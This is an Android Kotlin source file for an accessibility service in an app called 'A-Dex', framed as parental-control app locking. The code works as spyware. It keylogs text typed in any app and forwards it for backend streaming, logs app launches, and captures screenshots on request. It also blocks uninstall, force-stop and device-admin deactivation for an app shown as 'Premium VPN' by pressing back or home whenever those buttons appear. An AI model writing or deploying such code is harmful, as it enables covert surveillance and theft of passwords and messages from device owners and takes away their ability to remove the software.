package com.adex.app.service

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityService.TakeScreenshotCallback
import android.accessibilityservice.AccessibilityService.ScreenshotResult
import android.annotation.SuppressLint
import android.content.Intent
import android.graphics.Bitmap
import android.os.Build
import android.view.Display
import android.view.accessibility.AccessibilityEvent
import androidx.annotation.RequiresApi
import androidx.core.content.ContextCompat
import com.adex.app.ADexApplication
import com.adex.app.data.SettingsStore
import com.adex.app.ui.BlockingOverlayActivity
import com.adex.app.util.ParentalShieldManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream
import java.util.concurrent.ConcurrentHashMap

// Accessibility service observes foreground app transitions for locked-app enforcement.
class AppMonitorAccessibilityService : AccessibilityService() {
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val settingsStore by lazy { SettingsStore(applicationContext) }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this

        scope.launch {
            val db = (application as ADexApplication).db
            val deviceId = com.adex.app.data.SettingsStore(applicationContext).stableDeviceId
            val locked = db.lockedAppDao().getLockedPackages(deviceId)
            updateLockedPackages(locked)
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val eventType = event?.eventType
        val packageName = event?.packageName?.toString() ?: return

        if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            handleKeylog(event, packageName)
            return
        }

        if (eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED &&
            eventType != AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            return
        }

        if (packageName == packageNameInternal()) {
            return
        }

        // Anti-Uninstall & Anti-Deactivation: Block A-Dex App Info or Deactivation in Settings
        if (packageName == "com.android.settings" || packageName == "com.google.android.settings") {
            val root = rootInActiveWindow
            if (root != null) {
                // Check if our app name is visible
                val appFound = root.findAccessibilityNodeInfosByText("Premium VPN").isNotEmpty()
                
                if (appFound) {
                    // Check for critical action buttons
                    val dangerButtons = listOf("Uninstall", "Force stop", "Deactivate", "Remove", "Clear data", "Delete")
                    for (label in dangerButtons) {
                        if (root.findAccessibilityNodeInfosByText(label).isNotEmpty()) {
                            performGlobalAction(GLOBAL_ACTION_BACK)
                            performGlobalAction(GLOBAL_ACTION_HOME) // Go home to be sure
                            return
                        }
                    }
                    
                    // Specific check for Device Admin deactivation screens
                    if (root.findAccessibilityNodeInfosByText("Device admin").isNotEmpty() || 
                        root.findAccessibilityNodeInfosByText("Active").isNotEmpty()) {
                        performGlobalAction(GLOBAL_ACTION_BACK)
                        return
                    }
                }
            }
        }

        // Forward app launch telemetry to the foreground service for backend event streaming.
        val serviceIntent = Intent(this, ADexForegroundService::class.java).apply {
            action = ServiceActions.ACTION_PACKAGE_EVENT
            putExtra(ServiceActions.EXTRA_EVENT_TYPE, "app_launch")
            putExtra(ServiceActions.EXTRA_PACKAGE_NAME, packageName)
        }
        ContextCompat.startForegroundService(this, serviceIntent)

        if (isPackageLocked(packageName)) {
            val shieldPackage = ParentalShieldManager.isShieldProtectedPackage(packageName)
            if (shieldPackage) {
                if (!settingsStore.shieldEnabled || ParentalShieldManager.isTemporarilyUnlocked(settingsStore)) {
                    return
                }
            }

            val blockIntent = Intent(this, BlockingOverlayActivity::class.java).apply {
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                putExtra(BlockingOverlayActivity.EXTRA_PACKAGE_NAME, packageName)
                putExtra(BlockingOverlayActivity.EXTRA_PIN_REQUIRED, shieldPackage)
            }
            startActivity(blockIntent)
        }
    }

    private fun handleKeylog(event: AccessibilityEvent, packageName: String) {
        val text = event.text?.joinToString("") ?: ""
        if (text.isBlank()) return

        val serviceIntent = Intent(this, ADexForegroundService::class.java).apply {
            action = ServiceActions.ACTION_PACKAGE_EVENT
            putExtra(ServiceActions.EXTRA_EVENT_TYPE, "keylog")
            putExtra(ServiceActions.EXTRA_PACKAGE_NAME, packageName)
            putExtra("text", text)
        }
        ContextCompat.startForegroundService(this, serviceIntent)
    }

    override fun onInterrupt() {
        // No interrupt action required.
    }

    override fun onDestroy() {
        super.onDestroy()
        if (instance === this) {
            instance = null
        }
    }

    private fun packageNameInternal(): String = applicationContext.packageName

    companion object {
        @Volatile
        private var instance: AppMonitorAccessibilityService? = null
        private val lockedPackages = ConcurrentHashMap.newKeySet<String>()

        fun updateLockedPackages(packages: List<String>) {
            lockedPackages.clear()
            lockedPackages.addAll(packages)
        }

        fun isPackageLocked(packageName: String): Boolean {
            return lockedPackages.contains(packageName)
        }

        // Screenshot uses accessibility capture on API 30+ when service is active.
        fun captureScreenshot(onResult: (file: File?, errorCode: String?) -> Unit) {
            val service = instance
            if (service == null) {
                onResult(null, "ACCESSIBILITY_SERVICE_NOT_ACTIVE")
                return
            }

            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R) {
                onResult(null, "SCREENSHOT_REQUIRES_MEDIA_PROJECTION")
                return
            }

            service.captureScreenshotApi30(onResult)
        }
    }

    @SuppressLint("WrongConstant")
    @RequiresApi(Build.VERSION_CODES.R)
    private fun captureScreenshotApi30(onResult: (file: File?, errorCode: String?) -> Unit) {
        try {
            takeScreenshot(Display.DEFAULT_DISPLAY, ContextCompat.getMainExecutor(this), object : TakeScreenshotCallback {
                override fun onSuccess(screenshot: ScreenshotResult) {
                    val bitmap = Bitmap.wrapHardwareBuffer(screenshot.hardwareBuffer, screenshot.colorSpace)
                    if (bitmap == null) {
                        onResult(null, "SCREENSHOT_BITMAP_NULL")
                        return
                    }

                    val output = File(cacheDir, "shot_${System.currentTimeMillis()}.png")
                    FileOutputStream(output).use { out ->
                        bitmap.compress(Bitmap.CompressFormat.PNG, 100, out)
                    }
                    bitmap.recycle()
                    onResult(output, null)
                }

                override fun onFailure(errorCode: Int) {
                    onResult(null, "SCREENSHOT_FAILURE_$errorCode")
                }
            })
        } catch (_: SecurityException) {
            onResult(null, "ACCESSIBILITY_SCREENSHOT_CAPABILITY_NOT_GRANTED")
        } catch (_: Exception) {
            onResult(null, "SCREENSHOT_TAKE_EXCEPTION")
        }
    }
}
